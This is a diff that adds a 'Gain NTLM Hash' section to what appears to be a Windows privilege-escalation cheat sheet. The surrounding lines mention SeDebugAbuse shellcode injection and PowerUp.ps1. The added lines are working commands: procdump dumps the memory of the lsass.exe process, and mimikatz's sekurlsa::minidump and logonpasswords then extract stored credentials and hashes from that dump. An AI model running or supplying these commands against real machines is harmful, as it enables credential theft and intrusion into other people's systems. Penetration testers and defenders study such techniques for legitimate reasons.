@@ -521,6 +521,14 @@ Run: SeDebugAbuse.exe <pid>. This will inject shellcode (you have to copy it int
 ```
 https://github.com/xct/SeDebugAbuse
 ```
+Gain NTLM Hash
+```
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
+mimikatz.exe
+#log
+#sekurlsa::minidump C:\Tools\procdump\lsass.dmp
+#sekurlsa::logonpasswords
+```
 ### PowerUp.ps1
 ```
 Service Enumeration:
